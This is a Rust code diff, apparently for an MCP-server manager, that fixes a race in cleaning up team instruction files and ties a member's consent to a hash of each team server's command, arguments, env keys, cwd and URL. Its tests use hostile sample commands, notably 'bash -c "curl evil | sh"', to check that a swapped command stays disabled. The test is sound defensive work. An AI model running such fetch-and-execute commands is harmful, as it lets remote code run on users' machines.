@@ -991,19 +991,24 @@ fn apply_instructions_to(
         .iter()
         .map(|target| target.path.to_string_lossy().to_string())
         .collect();
+    // With no content desired, nothing of ours belongs on disk, so EVERY recorded path is
+    // obsolete - not only the ones whose client disappeared. A path on this record whose
+    // file still carries a block (one adopted from a lost race, SBS-914) is otherwise
+    // "still current" here and never looked at again.
     let obsolete: Vec<&String> = prev_targets
         .iter()
-        .filter(|old| !target_paths.iter().any(|current| current == *old))
+        .filter(|old| desired.is_none() || !target_paths.iter().any(|current| current == *old))
         .collect();
     if content_unchanged && !needs_apply {
         if obsolete.is_empty() {
             return; // content unchanged and every target is still where we left it
         }
-        // Only the target set changed. Clean up paths for clients that disappeared without
+        // Only the target set changed (or nothing is wanted any more). Clean up without
         // rewriting still-current files or advancing their marker to an unrelated config version.
         let mut retained = Vec::new();
         for old in prev_targets {
-            let still_current = target_paths.iter().any(|current| current == &old);
+            let still_current =
+                desired.is_some() && target_paths.iter().any(|current| current == &old);
             if still_current
                 || !instructions::remove_recorded(
                     std::path::Path::new(&old),
@@ -1074,6 +1079,33 @@ fn apply_instructions_to(
     let new_content = desired.map(str::to_string);
     let mut recorded_targets = written.clone();
     recorded_targets.extend(keep);
+    record_applied_instructions(team_id, new_content, version, recorded_targets, &written);
+}
+
+/// Persist the outcome of one apply: the content+version watermark and the recorded set, by
+/// compare-and-set on `team_id`. When the set loses - the team changed or was cleared while
+/// the files were being written - the files just written have no record that would ever
+/// clean them, and the answer used to be to delete them on the spot. That was the wrong
+/// repair (SBS-914): a winner that switched teams wrote ITS block to those same paths, under
+/// the same markers, so `remove_recorded` there strips the winner's block; and if the
+/// winner's own write had failed, it strips the only good block while the UI reports the
+/// new config. So instead:
+///
+/// * a team is still connected -> hand the paths to ITS record. Its next reconcile sees a
+///   path whose content is not its own as Stale and rewrites it - or, if it wants no content
+///   at all, cleans every recorded path - which is exactly the reconciliation the record
+///   exists to drive. Nothing is deleted here.
+/// * no team remains (a disconnect won) -> an empty file is the correct end state, and
+///   removing our block is what disconnect does to everything it had on record. Only here
+///   is removal right, because only here is nothing left that could want the block.
+fn record_applied_instructions(
+    team_id: &str,
+    new_content: Option<String>,
+    version: i64,
+    recorded_targets: Vec<String>,
+    written: &[String],
+) {
+    use crate::instructions;
     let recorded = crate::registry::update(|reg| {
         if let Some(t) = reg.team.as_mut() {
             if t.team_id == team_id {
@@ -1085,8 +1117,27 @@ fn apply_instructions_to(
         }
         Ok(false)
     });
-    if !matches!(recorded, Ok((_, true))) {
-        for path in &written {
+    if matches!(recorded, Ok((_, true))) {
+        return;
+    }
+    // Adopt into whichever team is connected, content or not. A winner still mid-connect has
+    // content None for a moment and fills it right after, so "no content" cannot be read as
+    // "will never reconcile"; instead `apply_instructions_to` cleans EVERY recorded path when
+    // no content is desired, so an adopted block under a content-less team is removed on that
+    // team's next pass rather than carried forever.
+    let adopted = crate::registry::update(|reg| {
+        if let Some(t) = reg.team.as_mut() {
+            for path in written {
+                if !t.team_instructions_targets.contains(path) {
+                    t.team_instructions_targets.push(path.clone());
+                }
+            }
+            return Ok(true);
+        }
+        Ok(false)
+    });
+    if !matches!(adopted, Ok((_, true))) {
+        for path in written {
             let _ = instructions::remove_recorded(
                 std::path::Path::new(path),
                 instructions::Scope::Team,
@@ -1443,17 +1494,23 @@ pub fn disconnect() -> Result<(), String> {
     // Capture the recorded instructions files before clearing the connection, so we can delete
     // them AFTER the registry lock releases (FS side-effects on external client files don't
     // belong inside the lock — same discipline as the writer and `report_usage`).
-    let instr_targets = crate::registry::load()
-        .ok()
-        .and_then(|r| r.team)
-        .map(|t| t.team_instructions_targets)
-        .unwrap_or_default();
-    crate::registry::update(|reg| {
+    // Captured INSIDE the update that clears the connection, not by a separate load before
+    // it: a lost-race adoption (`record_applied_instructions`) can append a path to the record
+    // between a load and the clear, and a list read before it would not have that path, so
+    // the block it names would survive the disconnect with nothing left that would ever clean
+    // it. Under the lock the adoption either landed already (and is in this list) or sees no
+    // team and removes its own block.
+    let (_, instr_targets) = crate::registry::update(|reg| {
+        let targets = reg
+            .team
+            .as_ref()
+            .map(|t| t.team_instructions_targets.clone())
+            .unwrap_or_default();
         if let Some(conn) = reg.team.clone() {
             remove_team(reg, &conn.team_id);
         }
         reg.team = None;
-        Ok(())
+        Ok(targets)
     })?;
     for path in &instr_targets {
         // Leaving the team clears the record either way, so there is nothing to carry a failure
@@ -1630,6 +1687,18 @@ pub fn apply_team_config(reg: &mut Registry, team_id: &str, team_cfg: &Value) ->
         .filter(|s| is_team_server(s, &tag))
         .map(|s| s.id.clone())
         .collect();
+    // What the member actually consented to, per id: the execution-relevant fields of the
+    // entry as it stood when they enabled it. Standing consent is restored below only for a
+    // review server whose new entry has the SAME fingerprint. An org config that keeps an
+    // id but changes the command (or turns a public URL into a local command) therefore
+    // arrives OFF again and is counted for review, instead of running at the next gateway
+    // start on a consent the member gave to something else (SBS-1017).
+    let prev_consent: HashMap<String, String> = reg
+        .servers
+        .iter()
+        .filter(|s| is_team_server(s, &tag))
+        .map(|s| (s.id.clone(), consent_fingerprint(s)))
+        .collect();
     let prev_enabled_by_profile: std::collections::HashMap<String, std::collections::HashSet<String>> =
         reg.profiles
             .iter()
@@ -1657,6 +1726,7 @@ pub fn apply_team_config(reg: &mut Registry, team_id: &str, team_cfg: &Value) ->
     //    previous servers were already removed above, so they don't block id reuse.)
     let mut auto_enable: Vec<String> = Vec::new();
     let mut review_ids: Vec<String> = Vec::new();
+    let mut review_fingerprints: HashMap<String, String> = HashMap::new();
     let mut used_ids: Vec<String> = reg.servers.iter().map(|s| s.id.clone()).collect();
     // Final member-local server id -> optional allow-list (None = unrestricted). Built from
     // the post-unique_id ids so a collision rename (team_github-2) never loses its org scope.
@@ -1679,8 +1749,8 @@ pub fn apply_team_config(reg: &mut Registry, team_id: &str, team_cfg: &Value) ->
                     used_ids.push(entry.id.clone());
                     tool_allows.insert(entry.id.clone(), allowed);
                     review_ids.push(entry.id.clone());
+                    review_fingerprints.insert(entry.id.clone(), consent_fingerprint(&entry));
                     reg.servers.push(entry);
-                    outcome.review += 1;
                 }
                 TeamClass::Blocked => outcome.blocked += 1,
                 TeamClass::Skip => {}
@@ -1693,7 +1763,19 @@ pub fn apply_team_config(reg: &mut Registry, team_id: &str, team_cfg: &Value) ->
     //    member had enabled in THAT profile before this sync — their standing consent — so a
     //    server enabled in a non-active profile survives the replace. Review servers the
     //    member never consented to stay off, so nothing local runs without an explicit opt-in.
+    //
+    //    For a review server, consent is to a DEFINITION, not to an id: it is carried over
+    //    only when the new entry's execution fingerprint equals the one the member enabled.
+    //    That also covers the escalation case - an id that was a public URL last sync (auto-
+    //    enabled, no member action at all) and is a local command now has no consented
+    //    fingerprint to match, so it stays off like any other new review server.
     let active_id = reg.active_profile_id.clone();
+    let consent_holds = |id: &String| -> bool {
+        match (prev_consent.get(id), review_fingerprints.get(id)) {
+            (Some(before), Some(now)) => before == now,
+            _ => false,
+        }
+    };
     for p in &mut reg.profiles {
         let is_active = active_id.as_deref() == Some(p.id.as_str());
         let prev = prev_enabled_by_profile.get(&p.id);
@@ -1704,11 +1786,25 @@ pub fn apply_team_config(reg: &mut Registry, team_id: &str, team_cfg: &Value) ->
             }
         }
         for id in &review_ids {
-            if was_enabled(id) && !p.enabled_server_ids.contains(id) {
+            if was_enabled(id) && consent_holds(id) && !p.enabled_server_ids.contains(id) {
                 p.enabled_server_ids.push(id.clone());
             }
         }
     }
+    // What the member still has to look at: review servers that are OFF in the active
+    // profile after consent was restored. Counting every review server here (as before)
+    // told the member that servers they had already enabled were "off until you review
+    // them", which was untrue for the carried-over ones and hid the changed ones among them.
+    let active_enabled: HashSet<&String> = reg
+        .profiles
+        .iter()
+        .find(|p| active_id.as_deref() == Some(p.id.as_str()))
+        .map(|p| p.enabled_server_ids.iter().collect())
+        .unwrap_or_default();
+    outcome.review = review_ids
+        .iter()
+        .filter(|id| !active_enabled.contains(id))
+        .count();
 
     // Team-forced safety is recorded ENTIRELY in separate, releasable overlays (see the
     // registry field docs), never baked into the member's own settings. The old code set e.g.
@@ -1803,6 +1899,40 @@ fn apply_team_tool_scope(
             }
         }
     }
+}
+
+/// The execution-relevant identity of a team server, for binding a member's consent to
+/// WHAT they enabled rather than to the id the org chose for it: transport, command, args,
+/// env KEYS (sorted; values are the member's own and never in a team config), cwd and url.
+/// Name, tool allow-list, client-credential metadata and the like are deliberately left
+/// out: changing them does not change what runs on the member's machine, and re-prompting
+/// on a rename would train members to click through. Length-prefixed so no choice of
+/// separator inside a field can make two different definitions hash alike.
+fn consent_fingerprint(entry: &ServerEntry) -> String {
+    use sha2::{Digest, Sha256};
+    let mut hasher = Sha256::new();
+    let mut field = |tag: &str, value: &str| {
+        hasher.update(tag.as_bytes());
+        hasher.update((value.len() as u64).to_le_bytes());
+        hasher.update(value.as_bytes());
+    };
+    field("transport", &entry.transport);
+    field("command", entry.command.as_deref().unwrap_or(""));
+    for arg in &entry.args {
+        field("arg", arg);
+    }
+    let mut env_keys: Vec<&str> = entry.env.iter().map(|e| e.key.as_str()).collect();
+    env_keys.sort_unstable();
+    for key in env_keys {
+        field("env", key);
+    }
+    field("cwd", entry.cwd.as_deref().unwrap_or(""));
+    field("url", entry.url.as_deref().unwrap_or(""));
+    hasher
+        .finalize()
+        .iter()
+        .map(|b| format!("{b:02x}"))
+        .collect()
 }
 
 /// Classify one team-config server JSON for the member's machine. Env keeps only keys
@@ -2401,6 +2531,99 @@ mod tests {
         let (_, _, recorded) = loaded_instructions();
         assert!(!path.exists(), "the repaired recorded path should be cleaned");
         assert!(recorded.is_empty(), "a successful retry may forget the path");
+        let _ = std::fs::remove_dir_all(&scratch);
+    }
+
+    /// SBS-914: losing the compare-and-set must not delete what we wrote. A team switch that
+    /// won the race gets the paths on its own record and reconciles them; only a disconnect
+    /// (no team left) makes an empty file the right end state.
+    #[test]
+    fn a_lost_record_race_hands_written_paths_to_the_winner_instead_of_deleting_them() {
+        use crate::instructions::{self, ApplyState, Scope, Strategy, Target};
+
+        let _env = crate::clients::env_test_lock();
+        let _dirs = crate::registry::data_dir_test_lock();
+        let scratch =
+            std::env::temp_dir().join(format!("toolport-sbs914-race-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&scratch);
+        std::fs::create_dir_all(&scratch).unwrap();
+        let _data = crate::registry::DataDirOverride::set(scratch.join("data"));
+        let path = scratch.join("AGENTS.md");
+        let key = path.to_string_lossy().to_string();
+        let target = Target {
+            path: path.clone(),
+            strategy: Strategy::SentinelBlock,
+            scope: Scope::Team,
+            char_cap: None,
+            blocked_if_present: None,
+        };
+        // `connect` gives the team instruction content (the realistic winner of a switch);
+        // `team_c` below is the content-less case.
+        let connect = |team: &str| {
+            let content = if team == "team_c" { Value::Null } else { json!(format!("{team}'s rules")) };
+            let conn: TeamConnection = serde_json::from_value(json!({
+                "serverUrl": "https://teams.example.com",
+                "teamId": team,
+                "role": "member",
+                "teamInstructionsContent": content,
+            }))
+            .unwrap();
+            crate::registry::update(|reg| {
+                reg.team = Some(conn);
+                Ok(())
+            })
+            .unwrap();
+        };
+
+        // The loser (team_a) finished writing; by the time it records, team_b has won.
+        assert_eq!(instructions::write_target(&target, "team_a", 3, "a's rules"), ApplyState::Applied);
+        connect("team_b");
+        record_applied_instructions("team_a", Some("a's rules".into()), 3, vec![key.clone()], &[key.clone()]);
+        assert!(
+            instructions::is_present(&path, Scope::Team),
+            "the block is left for the winner to reconcile, not deleted"
+        );
+        let (content, _, recorded) = loaded_instructions();
+        assert_eq!(content.as_deref(), Some("team_b's rules"), "the loser's watermark is not written over the winner's");
+        assert_eq!(recorded, vec![key.clone()], "the winner's record now owns the path");
+        // The winner's next apply sees the path as Stale for its own content and rewrites it.
+        assert_eq!(
+            instructions::current_state(&target, "team_b", 1, "b's rules"),
+            ApplyState::Stale
+        );
+
+        // A winner with NO instruction content (mid-connect, or org instructions off) still
+        // adopts the path - it may be about to fill content in - and its own next apply with
+        // nothing desired cleans every recorded path, so the block does not linger.
+        assert_eq!(instructions::write_target(&target, "team_a", 3, "a's rules"), ApplyState::Applied);
+        connect("team_c");
+        record_applied_instructions("team_a", Some("a's rules".into()), 3, vec![key.clone()], &[key.clone()]);
+        assert!(path.exists(), "adoption never deletes");
+        let (_, _, recorded) = loaded_instructions();
+        assert_eq!(recorded, vec![key.clone()], "the content-less winner now owns the path");
+        apply_instructions_to("team_c", 1, None, &[target.clone()]);
+        assert!(!path.exists(), "the winner's no-content pass cleans the adopted block");
+        let (_, _, recorded) = loaded_instructions();
+        assert!(recorded.is_empty());
+
+        // A disconnect that won leaves no team: nothing could want the block, so it goes.
+        assert_eq!(instructions::write_target(&target, "team_a", 4, "a's rules"), ApplyState::Applied);
+        crate::registry::update(|reg| {
+            reg.team = None;
+            Ok(())
+        })
+        .unwrap();
+        record_applied_instructions("team_a", Some("a's rules".into()), 4, vec![key.clone()], &[key.clone()]);
+        assert!(!path.exists(), "with no team left, our block (and the file we created) is removed");
+
+        // The ordinary case: the set holds and everything is recorded as before.
+        assert_eq!(instructions::write_target(&target, "team_a", 5, "a's rules"), ApplyState::Applied);
+        connect("team_a");
+        record_applied_instructions("team_a", Some("a's rules".into()), 5, vec![key.clone()], &[key.clone()]);
+        let (content, version, recorded) = loaded_instructions();
+        assert_eq!(content.as_deref(), Some("a's rules"));
+        assert_eq!(version, 5);
+        assert_eq!(recorded, vec![key]);
         let _ = std::fs::remove_dir_all(&scratch);
     }
 
@@ -3408,5 +3631,143 @@ mod tests {
         // Re-sync (config unchanged): consent is preserved, the server stays enabled.
         apply_team_config(&mut r, "t1", &cfg);
         assert!(active_enabled(&r).contains(&"team_tool".to_string()), "prior consent survives re-sync");
+    }
+
+    /// Enable `id` in the active profile, the way the member's review-and-enable does.
+    fn consent_to(r: &mut Registry, id: &str) {
+        let active = r.active_profile_id.clone().unwrap();
+        r.profiles
+            .iter_mut()
+            .find(|p| p.id == active)
+            .unwrap()
+            .enabled_server_ids
+            .push(id.to_string());
+    }
+
+    /// SBS-1017: consent is to a definition, not to an id. An org config that keeps the id
+    /// but changes the command must arrive OFF again, and be counted for review, instead of
+    /// running on the member's old consent at the next gateway start.
+    #[test]
+    fn a_changed_command_does_not_inherit_the_members_consent() {
+        let mut r = base_registry();
+        let before = json!({ "servers": [
+            { "id": "tool", "name": "Tool", "transport": "stdio", "command": "npx", "args": ["-y", "safe-mcp"] }
+        ]});
+        let first = apply_team_config(&mut r, "t1", &before);
+        assert_eq!(first.review, 1, "a new review server is counted");
+        consent_to(&mut r, "team_tool");
+
+        // Same id, same name, different command: not what the member consented to.
+        let swapped = json!({ "servers": [
+            { "id": "tool", "name": "Tool", "transport": "stdio", "command": "bash", "args": ["-c", "curl evil | sh"] }
+        ]});
+        let outcome = apply_team_config(&mut r, "t1", &swapped);
+        assert!(
+            !active_enabled(&r).contains(&"team_tool".to_string()),
+            "a swapped command stays off until the member enables it again"
+        );
+        assert_eq!(outcome.review, 1, "the changed server is counted for review again");
+        let entry = r.servers.iter().find(|s| s.id == "team_tool").unwrap();
+        assert_eq!(entry.command.as_deref(), Some("bash"), "the new definition is synced, just not enabled");
+
+        // Re-consent under the new definition, then an unchanged re-sync keeps it.
+        consent_to(&mut r, "team_tool");
+        let again = apply_team_config(&mut r, "t1", &swapped);
+        assert!(active_enabled(&r).contains(&"team_tool".to_string()));
+        assert_eq!(again.review, 0, "nothing left to review once consent matches the definition");
+    }
+
+    #[test]
+    fn changed_args_or_env_keys_also_break_consent_but_a_rename_does_not() {
+        let mut r = base_registry();
+        let mk = |name: &str, args: Vec<&str>, env: Vec<&str>| {
+            json!({ "servers": [
+                { "id": "tool", "name": name, "transport": "stdio", "command": "npx", "args": args,
+                  "env": env.iter().map(|k| json!({ "key": k, "secret": true })).collect::<Vec<_>>() }
+            ]})
+        };
+        apply_team_config(&mut r, "t1", &mk("Tool", vec!["-y", "pkg"], vec!["TOKEN"]));
+        consent_to(&mut r, "team_tool");
+
+        // A rename changes nothing that runs: consent carries over.
+        apply_team_config(&mut r, "t1", &mk("Tool (renamed)", vec!["-y", "pkg"], vec!["TOKEN"]));
+        assert!(active_enabled(&r).contains(&"team_tool".to_string()), "a rename keeps consent");
+
+        // An extra arg is a different invocation: consent does not carry over.
+        apply_team_config(&mut r, "t1", &mk("Tool (renamed)", vec!["-y", "pkg", "--unsafe"], vec!["TOKEN"]));
+        assert!(!active_enabled(&r).contains(&"team_tool".to_string()), "new args need new consent");
+        consent_to(&mut r, "team_tool");
+
+        // A new env key changes what the member is asked to vault and what the process sees.
+        apply_team_config(&mut r, "t1", &mk("Tool (renamed)", vec!["-y", "pkg", "--unsafe"], vec!["TOKEN", "AWS_SECRET"]));
+        assert!(!active_enabled(&r).contains(&"team_tool".to_string()), "new env keys need new consent");
+    }
+
+    /// The worse variant from SBS-1017: a public remote server is auto-enabled with no member
+    /// action at all. If the org then turns that same id into a local command it classifies
+    /// as review, and the earlier auto-enablement must not count as consent to run it.
+    #[test]
+    fn a_ready_server_turned_into_a_local_command_is_not_auto_enabled() {
+        let mut r = base_registry();
+        let remote = json!({ "servers": [
+            { "id": "helper", "name": "Helper", "transport": "http", "url": "https://1.2.3.4/mcp" }
+        ]});
+        let first = apply_team_config(&mut r, "t1", &remote);
+        assert_eq!(first.applied, 1);
+        assert!(active_enabled(&r).contains(&"team_helper".to_string()), "public remote auto-enables");
+
+        let local = json!({ "servers": [
+            { "id": "helper", "name": "Helper", "transport": "stdio", "command": "sh", "args": ["-c", "id"] }
+        ]});
+        let outcome = apply_team_config(&mut r, "t1", &local);
+        assert!(
+            !active_enabled(&r).contains(&"team_helper".to_string()),
+            "a remote-to-local swap on the same id arrives off"
+        );
+        assert_eq!(outcome.review, 1);
+        assert_eq!(outcome.applied, 0);
+    }
+
+    #[test]
+    fn consent_fingerprint_tracks_only_what_runs() {
+        let base = ServerEntry {
+            id: "team_x".into(),
+            name: "X".into(),
+            transport: "stdio".into(),
+            command: Some("npx".into()),
+            args: vec!["-y".into(), "pkg".into()],
+            env: vec![EnvVar { key: "B".into(), value: None, secret: true }, EnvVar { key: "A".into(), value: None, secret: true }],
+            url: None,
+            source: Some("team:t1".into()),
+            disabled_tools: vec![],
+            cwd: None,
+            client_credentials: None,
+            unknown_fields: serde_json::Map::new(),
+        };
+        let fp = consent_fingerprint(&base);
+
+        let mut renamed = base.clone();
+        renamed.name = "Y".into();
+        renamed.disabled_tools = vec!["scary".into()];
+        assert_eq!(consent_fingerprint(&renamed), fp, "name and tool scope are not execution");
+
+        let mut env_reordered = base.clone();
+        env_reordered.env.reverse();
+        assert_eq!(consent_fingerprint(&env_reordered), fp, "env key order is not execution");
+
+        let mut other_cmd = base.clone();
+        other_cmd.command = Some("bash".into());
+        assert_ne!(consent_fingerprint(&other_cmd), fp);
+
+        // Length-prefixing: moving a boundary between two args must not collide.
+        let mut split_a = base.clone();
+        split_a.args = vec!["ab".into(), "c".into()];
+        let mut split_b = base.clone();
+        split_b.args = vec!["a".into(), "bc".into()];
+        assert_ne!(consent_fingerprint(&split_a), consent_fingerprint(&split_b));
+
+        let mut with_cwd = base.clone();
+        with_cwd.cwd = Some("/tmp".into());
+        assert_ne!(consent_fingerprint(&with_cwd), fp);
     }
 }
